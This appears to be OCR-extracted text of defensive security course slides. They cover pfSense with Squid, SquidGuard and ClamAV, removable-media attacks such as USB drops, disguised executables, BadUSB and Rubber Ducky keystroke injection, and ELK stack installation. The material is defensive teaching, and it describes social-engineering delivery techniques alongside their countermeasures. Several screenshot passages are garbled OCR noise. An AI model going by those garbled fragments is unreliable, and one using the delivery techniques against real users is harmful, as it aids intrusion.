For servers, it can serve as a reverse proxy, potentially as a reverse proxy cache or to perform preauthorization or load balancing and providing a centralized point for monitoring.

© 2017 Erik Van Buggenhout & Stephen Sims

93

Web Proxy Security Best Practices
Below are some best practices to improve the security posture of your proxy infrastructure:
· Enforce all outbound (HTIP) connectivity through the proxy · Only allow HTTP-based traffic on a number of standard, default ports
(e.g. 80, 443, 8080...) · Implement proxy-level authentication · Ensure detailed proxy logs are generated & retained · Implement categorization & black-listing
SAN~
Web Proxy Security Best Practices It's not enough to just deploy a web proxy and hope things will work out. .. Here are a few key best practices to consider when deploying a web proxy:
· Enforce all outbound HTTP traffic through the proxy so categorization and blacklisting can be applied on all connections.
· Only allow HTTP-based traffic on the most widely used ports, such as 80,443, and 8080. · Implement proxy-level authentication to restrict web access to authenticated users and potentially filter
based on user groups. · Make sure detai led proxy logs are generated and retained. These can be useful in case of
investigations. · Implement URL categorization and blacklisting to filter unwanted categories.

94

© 2017 Erik Van Buggenhout & Stephen Sims

Introducing PfSense
I
PfSense is an open-source firewall / router (Licensed under Apache 2.0)

~sense

· Currently maintained by Rubicon Communications, LLC (Netgate)
· First introduced in 2004 (As a Monowall fork)
· Based on FreeBSD (and its PF (PacketFilter)) · Easily extensible with additional packages (e.g. Squid proxy, ClamAV,
Suricata IDS, Snort IDS...) · Commercial support is available, though all functionality is available in
community (free) edition

Introducing PfSense PfSense is an open-source firewall/router that is currently being maintained by Rubicon Communications. It was first introduced in 2004 as a m0n0wall fork (http://mOnO.ch/wall/index.php). M0n0wall was a project aimed at creating a complete, embedded firewall software package, based on FreeBSD, along with a web server, PHP, and some other utilities.
As a result, pfSense is based on FreeBSD as well, including its PacketFilter (PF). It's easily extensible with additional packages, a lot of which we have discussed during this course already or will be discussing soon. Some examples are Squid, ClamAV, Suricata, and Snort.
Even though all functionality is available in the free community edition, commercial support is available. However, community support is available as well through discussions on the fora, etc.

© 2017 Erik Van Buggenhout & Stephen Sims

95

PfSense Main Interface

·o'Sen e

StalUS' OushboQld

---

-- - S-W- ,....,..,Ml·I1·1·ttt··400dtfHll7t
~-U,-..IO ....11187.717ldStc0211

-------,-)

...........,a11, 1J ltCZIT20'l7
-,,.,,...,10.>ftla.t..aJl·1'
DIKWl"lf...,..~ o
n.c"1COll("V)U ._..,Ml.l.aGK, 1~2~}, 1-«t)
· ----21~........
Tt'IIIM., 1111U 4UTC 1017
· 12,oa.1
· ,.,,...1102

"'1~t&CM
J.11,Vt +

J.~

·

,. . . . ., ...........
\000bt,w,T<1.. . . . . . . . . .>

o ·
+8
;co
,.,.,. . 10 . · 19.11.. HOMS

PfSense web interface
The PfSense interface is "easy on the eye" and provides a number of interesting functions:
General system administration (including new package installation) Network interfaces configuration Firewall rulesets (per interfaces) · Available services VPN configuration

PfSense Main Interface Pfsense's main interface is easy on the eye and provides a dashboard containing system information, such as the name, version, CPU type, uptime and some other stats. The firewall's interfaces are shown on the dashboard as well.
In the toolbar, at the top of the interface, there's a number of interesting functions, including general system administration, network interface configuration, firewall rulesets (per interface), available services, VPN configuration, status, and diagnostics.
Clicking one of the tabs opens a submenu where further functions can be selected.

96

© 2017 Erik Van Buggenhout & Stephen. Sims

PfSense & Squid Proxy Integration

Package / Proxy S,,r,er. General Settings/ General

Squ d Gc>Rtt,ll ~Ul n;~

~.-.,HPfMf

~.._..._ _..___,,,

~ ~ ~ A U C Q . N. . . . .k ........u d ~

~~ 0 lfMbkd..,_.M!l\lnfl...,taitN.AVdtf1 N~o-·Nl)NINMICl.ooe.Hebige~
~ 1 t ·.........N4'llflfl:......................... , , . . . ~
- - -) ::!,=========:::::==---_-,_--__--:.._ __.

~PIW'I

SUS fllMltN~N,ro,y....,._.~ Oft. Ot,rallf1~1:I

,._.,,,,.ca<,_~ naa:·N1X,111M(llf'Oll'YwY11"__,MfliOal'ldf"ICtM<l!...,. 10INrrrc.,,~~

,.....INS__.. .f-,o;.dor.1·"" 1M prOfJ..,... - , ~ - ' - · 4 t l

0

SAN~

PfSense squid proxy
The PfSense Squid proxy package provides the following configuration features:
· Caching (less relev,mt for security purposes): Antivirus (using ClamAV); BasicACLs: Traffic Management Authentication & Users;
For extended URL categorization & ACL control, the SquidGuard package can be added to PfSense

PfSense & Squid Proxy Integration PtSense allows integration with the proxy that we mentioned before, Squid. Through the Squid package, various proxy features such as caching, anti-virus (using ClamAV), basic ACLs, traffic management, and user authentication can be added. In case extended URL categorization and ACL controls are needed, the SquidGuard package can be added to pfSense as well.
All of the proxy settings can be configured through the pfSense user interface.

© 2017 Erik Van Buggenhout & Stephen Sims

97

PfSense & ClamAV

PfSensc ClamAV

ca...-o,,oi..
-------

_ _ _ _.,.,.Wo(t>o!..o)
.:I
""""- -,...,....,_ .,a.,,,,.v j
0 W. . . . Only"......... N,Wl:MWWMi,-U . . dolng
t ,._ ftct VOUffllll!tci'tlN~iladi,KtfJll!WWMwl'X'tdfeltlaf'tll ,_911t-.1Dlc.td!W........~6~ To~~~~·
------- t,.a.,e.,,..,10...,.~ ~·-NW·tOll"tdffWl~INIINftoti,,st.,«.' I ·-.::. lllq:r.&pfOwyn~com;tio;itt111.h&rff ~ -.,\,l'bGI.J I.Rl.
.~,S_ at.lr_ OWl_ ,inQd_ llluO"Hll"tl''fI,C<aMnN\-l¢~AaAl:l"iaul~M IUf'JWflN-tll,lngMHWpo&difll IMWlof~,.-.,.

The ClamAV tab in the Squid proxy package allows enabling the AV.
Additional settings: Determine what client info to send to ClamAV Redirect URL
· Enable Google Safe Browsing Exclude audio/video streams from AV scanning
· AV database update frequency and (mirror) servers

SANS

PfSense & ClamAV The C lamAV tab in the Squid proxy package allows enabling antivirus checking using ClamAV through Squid proxy.
-. The configuration allows determining what kind of client information should be sent to ClamAV, such as usernamc and/or IP. Advanced settings can be loaded by enabling manual configuration. This allows to manually modify configuration files. A redirect URL can be specified using the user interface and determines where a user will be redirected to in case a virus is detected. Support for Google Safe Browsing is included as well. It's possible to exclude streamed audio/video fi-om AV scanning, which could be detrimental to the stream's performance.

Finally, a number ofsettings specify the AV database updates. It's possible to set the update interval from Ih

to 24h, or to "never" if the database shouldn't be updated automatically. A regional database update mirror or

-.

optional database update server can be set as well.

.....

98

© 2017 Erik Van Buggenhout & Stephen Sims

PfSense & SquidGuard

~

-Q»cl;fflCC!Uoltto.,....~
l....,.,.Cf!HM. ..ipM1M.-or...~1orth . , . i t ~

~

........ -.b dltlilfl

lhf~·bunon·!IMbol:IOi'nOflbM~mvstbedlc,(edtoAveoon19JtaoonCMl'IQff,

TOK1NIW14NidGUlfd CQ('rf~~t,d,eA(;,pfrfbul'lonmu,tbedicbd.

LOAP Opllon1

SquidGuard
The SquidGuard package allows us to configure additional security controls such as:
· Group-based ACls; URL Categorization (based on custom categories or imported categories); Conditional URL rewriting; Blacklisting;
We will configure SquidGuard in the upcoming lab!

PfSense & SquidGuard To get more advanced security controls, the SquidGuard package can be installed and enabled, allowing group-based ACLs, URL categorization based on custom or imported categories, conditional URL rewriting, and blacklisting.
Using these free and open-source tools, it's possible to implement more than a basic solution providing security controls to your organization. We will configure pfSense with Squid, SquidGuard, and ClamA V in the upcoming lab!

© 2017 Erik Van Buggenhout & Stephen Sims

99

Web Proxies & PfSense-Additional Resources
Some additional resources that can prove to be useful for web proxies include:
· htq>s: //wwv.,.pfsense.org/ PfSense project web page
· htq>: //www.sguid-cache.org/ Squid web proxy
· http://www.sguidguard.org/ SquidGuard URL redirector
Web Proxies & PfSense - Additional Resources Some additional resources that can prove to be useful for web proxies include: https://www.pfsense.org/ PfSense project web page http://www.squid-cache.org/ Squid web proxy http://www.squidguard.org/ SquidGuard URL redirector

100

© 2017 Erik Van Buggenhout & Stephen Sims

Course Roadmap
· Day 1: Knowing the Adversary, Knowing Yourself
· Day 2: Avertin~ Payload Delivery · Day 3: Preventing Exploitation
· Day 4: Avoid ing Installation, Foiling Command & Con trol & Thwarting Lateral Movement
· Day 5: Exfiltration, Cyber Deception & Incident Response
· Day 6: APT Defender Capstone

Strategies for Preve nting / Detecting Payload De live ry End-User Security Aware ness Leve raging Suricata IDS / IPS E-mail Security Controls
Exercise: Building a Sandbox Using Suricata & Cuckoo Zooming in on YARA Rules
· Exercise: Finding the Needle in the Haystack Using YARA W e b Security Controls Exercise: Deploying PfSense Firewall with Squid & ClamAV Stopping De live ry Using Re m o vable Me dia Visualizing the Results of Our Solut ions Exercise: Developing Eye-Candy Using Kibana Contro lling Script in the Enterprise Exercise: Controlling Script Using GPO's

This page intentionally left blank.

© 2017 Erik Van Buggenhout & Stephen Sims

101

Exercise - Deploying PfSense Firewall with Squid & ClamAV
IThe objective of the lab is to set up a web proxy configuration to stop payloads being downloaded over HTTP(S). We will use a combination of open-source technologies to illustrate our set-up (PfSense, Squid & ClamAV).
High-level exercise steps: 1. Configure PfSense with Squid 2. Configure ClamAV &YARA rules to integrate with Squid in PfSense 3. Analyzing behavior when a malicious payload is downloaded over HTIP
SAN~
Exercise - Deploying PfSense Firewall with Squid & ClamAV The objective ofthe lab is to set up a web proxy configuration to stop payloads being downloaded over HTTP(S). We will use a combination ofopen-source technologies to illustrate our set-up (PfSensc, Squid, SquidGuard, ClamAV). Throughout the exercise, the following high-level steps will be delivered:
· Configure PtSense with Squid & SquidGuard; · Download & install open-source blacklists & categories in SquidGuard; · Review ClamAV configuration and enable ClamA V to integrate with Squid in PtSense · Analyzing behavior when a malicious payload is downloaded over HTTP For additional guidance & details on the lab, please refer to the LOOS workbook.

102

© 2017 Erik Van Buggenhout & Stephen Sims

Exercise - Deploying Pf'Sense Firewall with Squid & ClamAV - Conclusion

During this lab, we built a PfSense firewall with Squid & ClamAV technology to attempt blocking known malicious URLs and payloads in HTTP traffic:

~Sense PfSense as the base OS and firewall platform

,....

Squid & SquidGuard acting as proxy solution centralizing the outgoing

,......
,...

· '

HTIP(S) traffic and implementing security controls
ClamAV as an Antivirus engine detecting malicious payloads in HTTP(S) traffic

,,,.....

Exercise - Deploying PfSense Firewall with Squid & ClamAV - Conclusion During this lab, we built a PfSense firewall with Squid & ClamAV technology to attempt blocking known malicious URLs and payloads in HTTP traffic:
· We used PfSense as the base OS & firewall platfom1 (open-source); We used the Squid & SquidGuard PfSense packages to contro l HTTP(S) traffic & perform web filtering;
· We leveraged ClamAY as an Antivirus solution to detect and block known malicious payloads. As a side note: ClamAV also supports YARA rules and could thus be further extended to not only perform AV signature-based blocking.
In order to increase the added value for attendees, we have added the full solution as virtual machines to the course USB drives.

© 2017 Erik Van Buggenhout & Stephen Sims

103

Course Roadmap
· Day 1: Knowing the Adversary, Knowing Yourself
· Day 2: Averting Payload Delivery
· Day 3: Preventing Exploitation
· Day 4: Avoiding Installation, Foiling Command & Control & Thwarting Lateral Movement
· Day 5: Exfiltration, Cyber Deception & Incident Response
· Day 6: APT Defender Capstone

SEC599.2
Strategies for Preventing / Detecting Payload Delivery End-User Security Awareness Leveraging Suricata IDS/ IPS E-mail Security Controls
Exercise: Building a Sandbox Using Suricata & Cuckoo Zooming in on YARA Rules
Exercise: Finding the Needle in the Haystack Using YARA
· Web Security Controls Exercise: Deploying PfSense Firewall with Squid & ClamAV Stopping Delivery Using Removable Media Visualizing the Results of Our Solutions Exercise: Developing Eye-Candy Using Kibana Controlling Script in the Enterprise Exercise: Controlling Script Using GPO's

SAN.~

This page intentionally left blank.

104

© 2017 Erik Van Buggenhout & Stephen Sims

Stopping Delivery Using Removable Storage (I)
Executables and scripts used for initial intrusion can be delivered using removable storage
· Removable storage is mainly USB sticks · CDs, DVDs, HDs, WPD devices, floppies, tape ... are all types of
removable storage too · Initial intrusion is performed via executables stored on removable
storage · Windows machines can be locked down to prevent this · The USB protocol itself can also be abused for initial intrusion (e.g.
BadUSB)
SA~S
Stopping Delivery Using Removable Storage (1) Adversaries will try to penetrate our enterprise's perimeter through various means. Using removable storage for initial intrusion is a real risk, and has been used in attacks before.
One will think "USB Sticks" when we mention removable storage. This is correct, but there are many types of removable storage. There is "historical" removable storage that is only used in extremely rare cases, like floppy disks and tape.
CDs and DVDs are also removable storage, but their use is on decline since PC manufacturers no longer include a CD/DVD reader in a standard Windows machine.
WPD (Windows Portable Devices) are media players, cameras ... that connect to Windows but their storage is not mapped to a disk drive letter. They have to be accessed through an application.
Removable hard disks and memory cards (like SD cards) are another example of removable storage that is still in use.
Adversaries will put their payload for initial intrusion (executables like PE fil es or scripts) on removahle storage, and then introduce the removable storage inside the perimeter and have the payload executed on a corporate machine.
It is possible to configure Windows to refuse mounting of removable storage, and/or starting ofexecutables on removable storage.
These intrusion techniques rely on payloads stored as files on the file system of the storage device. With advanced adversaries, however, we also have to take into account attacks at a lower level, for example by infecting firmware of USB sticks. This was demonstrated in the BadUSB proof-of-concept.

© 2017 Erik Van Buggenhout & Stephen Sims

105

Stopping Delivery Using Removable Storage - Typical Use

A stock USB stick

Stock USB s tick contains payload

SAN~

The adversary prepares a payload for the initial intrusion

Through social engineering, staff is enticed to plug the
USS stick in an office machine

Payload compromises user's W indows machine
(IE
0

Stopping Delivery Using Removable Storage - Typical Use A typical attack with removable storage starts as follows:
· The adversary obtains a normal, stock USB stick · The payload is copied onto the USB stick, and depending on the environment, configured to execute
automatically upon insertion, or "conveyed" with social engineering. · The "weaponized" USB stick is then introduced into the target environment. There are many
techniques to do this: mailing ofUSB sticks under the guise of promotional material (after staff attended a conference), cleaning staff that brings the USB stick into the premises after hours, dropping of USB sticks in coffee rooms or smoker areas (a so-called waterhole attack)... · Staff receives the USB stick and is lured into plugging in the USB stick into one of their office machines. · The payload is executed on the office machine.

106

© 2017 Erik Van Buggenhout & Stephen Sims

Stopping Delivery Using Removable Storage (2)
IAutoRun is a Windows feature that could be abused to run an executable on a USB stick automatically upon insertion.
IAutoPlay is the default action of modern Windows versions: on insertion of removable media, AutoPlay displays a list of choices to the user.
IThrough social engineering, users can still be enticed to open an executable on removable media.
SANS
Stopping Delivery Using Removable Storage (2) AutoRun is a feature of Windows that allows the configuration of removable storage to run executables automatically, upon insertion without user interaction. This feature was used by software developers at a time when software was distributed via CDs. When buying a game or office application, installation was done by inserting a CD with the game/application into the Windows machine, and then start the installation program. To create user-friendly installations, AutoRun could be used to start the installation program automatically. This AutoRun feature has been abused a lot by malware authors, even in malware that would spread via USB sticks by "infecting" them via the AutoRun feature. Because of this abuse, Microsoft disabled this feature. AutoPlay is the modern variant of AutoRun. When removable storage is inserted, AutoPlay will display a list of choices to the user, allowing the user to decide what to do with the content of the USB stick. By default, there is no longer automatic execution. Malware authors and advanced adversaries will still use removable storage to compromise machines but will resort to social engineering to entice users to execute their malicious payload.

© 2017 Erik Van Buggenhout & Stephen Sims

107

Sto pping Delivery Using Removable Storage - AutoPlay

... ..utoP!oy
KINGSTON (E;) ~
0 oi.,
·,;u -:--""'-
Gu~tt~ op.o.ons
I o,,e., _ .,,....,...
. k ,;
Y·s» rners Aut0PltX0RHRffl (l (201~

AutoPlay in Windows
AutoPlay in Windows 7 is displayed upon drive insertion, and remains visible until the user interacts.
Windows IO AucoPlay displays a notification (above). the menu is only displayed when the user clicks the notification (below).

, <INGSTON·E·
KINGSTON (E:)
· faq noacoon

Stopping Delivery Using Removable Storage - AutoPlay AutoPlay is the default behavior of Windows machines starting with Windows 7. AutoPlay is a menu of choices that is displayed upon removable storage insertion. AutoPlay will inspect the content of the removable storage, and display options accordingly (for example play content with Windows Media Player, ifthe USB stick contains music or movies).
Other options are available too, like opening the drive to view the files, or using the disk for backup, ReadyBoost ...
On Windows 7, by default, this menu will be displayed automatically when removable storage is inserted. It will stay on screen until the user selects an action or closes the dialog. This dialog can be seen on the left of this slide.
Starting with Windows 8, the AutoPlay feature uses notifications. On Windows I0, a notification is presented to the user when removable storage is displayed (an example of this notification can be seen at the top right of this slide). Ifthe user does not click the notification, it will go away after a couple ofseconds. The menu of choices is only presented to the user when the user clicks upon the notification (example in the lower right of this slide).
It is possible to disable AutoPlay via a setting that can also be configured via the registry.

108

© 2017 Erik Van Buggenhout & Stephen Sims

Stopping Delivery Using Removable Storage -AutoRun

~ -- ......,.... ~.,., ... ,st..,..,,,,, . .....,"'"'

..,_

- ~- -- -

··-V. .........,..

- - .. .......

,,...

·.----.. -l-

Windows AutoRun feature uses an autorun.mf file Most features of the autorun.rnf file were disabled in Windows 7 onwards for security reasons.

Social engineering is used to entice users co launch executables. File readme.pdf below is actually an executable: readme.pdf.exe.
-< F,vontes · Oesbcp
.G OownkMlds
Recent Pt.us
l1bm,es Oocumenu
,I, Music

Stopping Delivery Using Removable Storage - AutoRun Because of wide-scale abuse, the AutoRun feature was first disabled on Windows 7 and onwards, and retroactively disabled on Windows XP and Vista via patches.
AutoRun is configured by creating a text file with name autorun.infin the root ofthe removable media. The content ofan autorun.inffile is formatted like an JNI file. It contains an [AutoRun] section, with entries like open=setup.exe. This will make that the program setup.exe (stored in the root ofthe removable media) is executed upon insertion.
But since the lockdown of AutoRun, all the sections that can be abused in autorun.inf are ignored, except for CDs and DVDs.
There has been plenty ofmalware that abused this AutoRun feature, by infecting USB sticks through the creation ofautorun.inffiles executing the ma lware that would copy itselfon the USB stick.
Nowadays, malware authors and adversaries rely on social eng ineering to entice users to execute their payload. For example, the payload is an executable (PE file) that contains the icon used for PDF files and is given the name rcadme.pdf.exe. This file is then stored in the root folder of a USB stick. When a user inserts this USB stick and views the content by choosing the files option in AutoPlay, the user will see something that has all the appearance of a normal PDF file. The name is readme.pdf, and the icon is that ofa PDF file. By default, Windows hides the extension of known file extensions. Thus rcadme.pdf.exe is displayed as readme.pdf, because .exe is a known extension. Ifthe user is fooled into thinking this is a normal PDF file, the user will open it to read its content, but this will launch the executable (depending on the settings, a UAC dialog mig ht be displayed first).

© 2017 Erik Van Buggenhout & Stephen Sims

109

Stopping Delivery Using Removable Storage - Prevention

Blocking executables on removable _st_or_a_g,;;e;._-,------------------- 0--,-,

· With modern Windows,

··

(I M r

l---~~·'---

1olAl

autorun.inf is no longer a risk · Social engineering is still a risk · Running of executables on

,~ , . o .., ....... ..,.. .a.ow.... ~
:=....... , . ................., . , . . .
~""""'
.......,._(....,__..-.,
M9
IID(
,..._

....,. . . 1......~. . . . ., . , _ <. . . . ....,.......,_ (0--~0..,--t<«M
'~°""f".c,..'.('+-Oetw"J,-,.·.t.e.u....·...
c - - - c - : ~. . . . .\ .
........ ~-...-- ,...,......,D-,_...,.,,,,.
,..,., ___ o.,-....~-

,........,_..
,...,,....,,....
1""4,..,...,..,
-~..,.._....4.-....-.....,.;..,..4....,..,....,
.... . . . . . . .
.... .........

USB sticks can be blocked through various means
· Access to USB sticks can be blocked completely

l.Nar~· l-e-
.~_,lo ...,., e -
" ....- ..,,· ~
....... "'--'-.
---·-=..._........,.._......,......,_.(.A..ct-

·---0...-0.,,. . . . .,"" ..,_..,~°'""'....., .,. ..........0...-0..,.a.ttlt..
,.-.-....~.M-~,tlM(~

,,__,,.......,..,..,.,....
,.,,_,4'1<1~
~,.,_....,....

....0-..°.".0"'....,........... ,._................,. ,l!M.........~..,.._..,_., ....,.......,....,.. """~

11 ·

i

....... .......

« 0..-....

--

.... .........

..OD,,,,at-.O..,...a. .-

. . . .. . . . . . . .

i ...0..-..-0.,----

, .. . ,. . . . . . . .

<.......-
....""''
........
... ..".."..
....,.......

SANS

Stopping Delivery Using Removable Storage - Prevention With autorun.infno longer presenting an issue, social engineering attacks have increased. User awareness is important to prevent users from falling into the traps ofattackers. There are also technical solutions.
Execution of PE files and scripts stored on removable storage can be prevented through various means. There are third-party solutions (free, open-source solutions and commercial offerings) to prevent execution. Commercial offerings are often integrated into an end-point-security product. Some commercial offerings are very flexible: their level ofcontrol is fine-grained when it comes to types of removable storage, users, and actions. For example, it is possible to configure a global no-execution policy, except for certain users and certain corporate owned, encrypted USB sticks.
Local Group Policies and Active Directory Group Policies can be used to lock down removable storage. Depending on the type of removable storage, it is possible to prevent all access, or only execution, writing or reading.
For Active Directory, these setting can be found in Computer Configuration / Policies / Administrative Templates I System I Removable Storage Access.
It is also possible to block execution via application whitelisting, which will be discussed on day 3.

110

© 2017 Erik Van Buggenhout & Stephen Sims

Stopping Delivery Using Removable Storage -Vulnerabilities

Executing code on removable storage using vulnerabilities

BadUSB

· Vulnerabilities in Windows have been abused to execute code automatically upon insertion ofremovable storage
· For example, the .lnk zero-day vulnerability allowed Stuxnet to infect Windows machines via removable storage
· Firmware of USB devices can be compromised to infect machines (BadUSB)
· The USB protocol can be abused to achieve code execution

SA~

Stopping Delivery Using Removable Storage - Vulnerabilities Executing (malicious) code via AutoRun or social engineering is not the only avenue ofattack that adversaries can take.
Different vulnerabilities can also lead to code execution upon insertion ofremovable storage. Known vulnerabilities in Windows have been patched, and a good patching policy will prevent exploitation. But unknown vulnerabilities (zero-day exploits) pose a problem. Also, vulnerabilities in the USB devices and USB protocol can be leveraged to obtain initial intrusion.
Stuxnet used a zero-day vulnerability in the .Ink file format to achieve code execution. A malformed .Lnk file with a link to a .dll file, both stored on a USB stick, lead to code execution in the Windows Explorer process when the content of the USB stick was browsed. It is likely that similar, undiscovered or undisclosed vulnerabilities exist.
BadUSB is proof-of-concept research that showed that a majority ofUSB sticks have writable firmware, that can be compromised: for example, the firmware can be modified to interact via the USB protocol in such a way with the host machine, that code execution on the host machine is achieved.
To try to prevent these types of attacks, more advanced methods are needed, like application whitelisting, or completely blocking untrusted USB devices.

© 2017 Erik Van Buggenhout & Stephen Sims

111

Another USB Danger - Rubber Ducky

Rubber Ducky is a "Keystroke Injection Attack Platform"

· Rubber Ducky abuses the built-in trust

modern OS'es have for keyboards (HID

~---~-- standard)

...... ·

Scripted keystrokes deliver up to 1000 words per minute

--.~ .... . i... £<111 _ io- _
~EM My First Payl oad

·I

WINDOWS r

· Cross platform

!DELAY 100
STRING notepad.exe

· Application whitelisting & software

ENTER DELAY 200

restrictions can stop the attack

STRING Hello world ! I'm in your PC !

Another USB Danger - Rubber Ducky Another type ofUSB danger is a Rubber Ducky. A Rubber Ducky makes use ofa keystroke injection attack, made possible by the trust an OS has for a Human Interface Device (HID). In short, a USB device claiming to be a keyboard HID will automatically be detected and accepted by most operating systems. As a result, this type ofattack can be executed cross-platform.
The device is able to deliver scripted keystrokes ofup to I000 words per minute using a s imple scripting language that can be edited using notepad. Through the community, there are multiple types of payloads available, a long with encoders and various toolkits . (https://forums.hakS.org/index.php?/forum/ 56-usb-rubberducky/)
The attack can be stopped through application whitelisting and proper software restrictions, for example by blocking cmd.exe in case that is used by the Ducky script. Another cool way to prevent the attack is "Duck.hunt" by Pedro M. Sosa. Duckhunt is a daemon script that monitors keyboard usage (speed and selected window for now) and drops or blocks keyboard strokes in case a violation is detected (https://g ithub.com/pmsosa/duckhunt).

112

© 201 7 Erik Van Buggenhout & Stephen Sims

Removable Media - Additional Resources
Some additional resources that can prove to be useful for removable media security strategies include:
· httj>s://hakshop.com/products/usb-rubber-ducky-deluxe Rubber Ducky USB attack tool (paid product)
· https: //opensource.srlabs.de/projects/badusb Bad USB main project web page
SAN.~
Removable Media - Additional Resources Some additional resources that can prove to be useful for removable media security strategies include: https:/ /hakshop.com/ products/ usb-rubber-ducky-deluxe Rubber Ducky USB attack tool (paid product) https://opensource.srlabs.de/projects/badusb Bad USB main project web page

© 2017 Erik Van Buggenhout & Stephen Sims

113

Course Roadmap
· Day 1: Knowing the Adversary, Knowing Yourself
· Day 2: Avertine Payload Delivery
· Day 3: Preventing Exploitation
· Day 4: Avoiding Installation, Foiling Command & Control & Thwarting Lateral Movement
· Day 5: Exfiltration, Cyber Deception & Incident Response
· Day 6: APT Defender Capstone

SEC599.2
Strategies for Preventing / Detecting Payload Delivery End-User Security Awareness Leveraging Suricata IDS / IPS E-mail Security Controls
Exercise: Building a Sandbox Using Suricata & Cuckoo Zooming in on YARA Rules
Exercise: Finding the Needle in the Haystack Using YARA Web Security Controls
· Exercise: Deploying PfSense Firewall with Squid & ClamAV Stopping Delivery U sing Removable Media Visualizing the Results of Our Solutions Exercise: Developing Eye-Candy Using Kibana Controlling Script in the Enterprise Exercise: Controlling Script Using GPO's

This page intentionally left blank.

114

© 2017 Erik Van Buggenhout & Stephen Sims

Visualizing the Results of Our Solutions
In order to set up a scalable and manageable solution, it's important we can easily monitor our security controls (without having to grep through end-less text-based logs)
Many differenl conunercial and open-source technologies exist: · Splunk · Elastic Search - Logstash - Kibana (ELK) by Elastic · Graylog
splunk> \· elastic grayl0g
SANS
Visualizing the Results of Our Solu tions
In order to set up a scalable and manageable solution, it's important we can easily monitor our security
controls (without having to grep through endless text-based logs). In addition, data is beautiful and the right visualizations and dashboard could be needed to convince management of the useful work you're performing.
There are many different commercial and open-source technologies available: · Splunk · Elastic Search - Logstash - Kibana (ELK) by Elastic · Graylog
Depending on your requirements, one of these will be more appropriate for your organization than others. Some key factors include budget, ease ofconfiguration, usability, support, integration with other products, and of course specific functionality. During this course, we will dive a little deeper in the ELK stack, open source with a lot of possibilities.

© 2017 Erik Van Buggenhout & Stephen Sims

115

Zooming in on the ELK Stack
I

elasticsearch

ElasticSearch is the "big data" solution used to store, index and query the large volumes of data. The query language used by ElasticSearch is Apache Lucene.

logstash
kibana
SANS

Logstash parses the logs submitted and stores them in ElasticSearch. Grok is used by Logstash to transform text patterns into a meaningful structure.
Kibana queries ElasticSearch and visualizes data. Custom dashboard development can be done in Kibana, which heavily relies on JSON.

Zooming in on the ELK Stack The ELK stack consists ofthree products working togetber, namely ElasticSearch, Logstash, and Kibana.
ElasticSearch is the big data solution and is used to store, index, and query the large volumes of data. lts functionality is similar to Splunk. Some ofthe underlying technologies used however are different. ElasticSearch makes use of Apache Lucene for information retrieval, originally completely written in Java, but meanwhile ported to C+i- and Python, among others.
Logstash is used for parsing logs submitted to the stack and stores the results in ElasticSearch. Logstash uses Grok to transform text patterns into a meaningful structure. Grok is perfect for syslog logs, Apache and other web server logs, mysql logs, and in general, any log format that is written for humans and not computer c onsumpti on.
Kibana takes care of the graphical component of the stack and visualizes data that it queries from ElasticSearch. Kibana can be used to implement custom dashboards, which heavily relies on JSON. Kibana has all the classics such as histograms, line graphs, and pie charts. It's also able to create geo maps, time series, and analyze relationships or anomalies using machine learning.

116

© 2017 Erik Van Buggenhout & Stephen Sims

A Note About ELK Security

elasticsearch

logstash

kibana

One important point to raise is that a default ELK stack install requires a number of security controls to be implemented:

· Kibana dashboards are by default accessible over HTTP without
authentication; Remediation: implement HTIPS + authentication on web server

· ElasticSearch engine cluster can be interacted with on TCP port 9200
without authentication Remediation: network segmentation or only listen on local interface

A Note About ELK Security Since we want to avoid wrapping all our data & information in a nice gift for adversaries to pick up, we need a number of security controls. By default, Kibana dashboards are reachable through HTTP without any form of authentication. This would allow anyone that is able to reach the server to view the dashboards. The solution is to implement HTIPS and authentication on the web server.
Additionally, the ElasticSearch engine cluster has a service running on TCP port 9200 that can be interacted with without authentication, which could allow an outsider to read data or shut down the cluster. This problem can be solved by network segmentation or only listening on a local interface, which would prevent access from another device on the same network.

© 2017 Erik Van Buggenhout & Stephen Sims

117

Installing ELK

In order to install ELK the following high-level steps are to be taken:

· Install Java
sudo add-apt-repository -y ppa:webupd8team/java sudo apt-get update sudo apt-get -y install oracle-java8-installer
· Install ElasticSearch

\· elastic

· Install Kibana

· Install Logstash

Pre-installed & pre-configured ELK appliances are available online from a variety of sources (e.g. Bitnami...)

Installing ELK In order to install ELK, the following high-level steps are to be taken:
· Install JAVA · Install ElasticSearch · Install Kibana · Install Logstash
No rocket science there, rig ht? On Ubuntu-based systems, installing JAVA can be easily performed by running the following commands:
· Add the Oracle Java PPA to apt sudo add-apt-repository -y ppa:webupd8teamljava
· Update the apt package database sudo apt-get update
· Install Java version 8 sudo apt-get -y ins/a/I oracle-java8-installer
Instead of installing everything ourselves, it's important to note that pre-installed & pre-configured ELK appliances are available online from a variety ofsources as well, reducing the installation and configuration overhead. A pre-config ured appliance, however, offers less flexibility and possibly runs with older versions of the different software components included.

118

© 2017 Erik Van Buggenhout & Stephen Sims

Installing ElasticSearch

ElasticSearch can be installed using a package manager.

· Import the public GPG key:
wget -qO - https://packages.elastic.co/GPG-KEY-elasticsearch
I sudo apt-key add -

elasticsearch

· Create the ElasticSearch source list
echo "deb http://packages.elastic.co/elasticsearch/x.x/debian stable main"
I sudo tee -a /etc/apt/sources.list.d/elasticsearch-x.x . list

· Update apt package database
sudo apt-get update
· Install ElasticSearch
sudo apt-get -y install elasticsearch

\
Your version number

Once the installation is complete, ElasticSearch can be interfaced with as any other service.

Installing ElasticSearch Once JAVA has been installed, we can move forward and start the ElasticSearch installation. Again, ElasticSearch allows for rather easy installation using a package manager:
· Import the public GPG key:
wget -qO - https:l/packages.elastic.co/GPG-KEY-elasticsearch I sudo apt-key add -
· Create the ElasticSearch source list (replace x.x with your desired ElasticSearch version number)
echo "deb http:llpackages.elastic.co/elasticsearchlx.xldebian stable main" I sudo tee -a
/etc/aptlsources.list.d/elasticsearch-x.x.Iist
· Update apt package database sudo apt-get update
Instal I ElasticSearch sudo apt-get -y install elasticsearch
Once the installation is complete.-:, E lasticSearch can be interfaced with as any other service. Next, we will look at configuring ElasticSearch for our purposes.

© 2017 Erik Van Buggenhout & Stephen Sims

119

ElasticSearch Configuration

The key ElasticSearch configuration file is elasticsearch.yml, located by default in / etc/elasticsearch · For our purposes, the ElasticSearch defaults are fine, but
keep in mind to restrict outside access in production through "network. host: localhost"
· Another important aspect is the configuration of available memory for optimal performance (see / etc/init.d/ elasticsearch). Two main guidelines: => Not more than 50% of available memory => Overall, not more than 32 GB

elasticsearch

ES_JAVA_OPTS="-Xms32g -Xmx32g"

SANS

